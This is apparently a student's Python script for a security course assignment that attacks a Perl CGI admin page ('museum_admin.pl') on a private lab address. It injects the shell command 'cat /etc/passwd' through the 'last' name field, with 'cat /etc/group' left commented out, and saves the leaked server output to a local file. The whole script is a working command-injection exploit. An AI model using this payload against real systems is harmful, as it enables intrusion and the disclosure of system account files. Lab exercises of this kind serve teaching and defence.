# Joshua Stuifbergen
# 4/28/19
# CISS 461
# Assignment 4 - Perl Attack

# The script below will direct to a Perl script and fill the fields
# with data that will cause a leak of information to print on the site.
# It will then be routed a file stored on the attackers local computer

# Supports POST requests to the input fields
import requests
# Location of the data fields for the admin to check on a file
url = 'http://10.7.64.2:8001/cgi-bin/museum_admin.pl'

# Variables for the executables in the input field
# first = "cat /etc/group"
last = "cat /etc/passwd"

# The section for the admin to review a file consists of the first and last user name
# and admin password field.
payload = {
    'first': 'danger',
    'last': last,
    'password': 'NothingToSeeHere',
}

# Goes to the path of museum_admin.pl and uploads payload data, matching variables from the museum_admin.pl program
r = requests.get(url, payload)
# The data acquired from the POST direct to be written to PWinfo file
file = open("PWinfo", "w")
file.write(str(r.content))
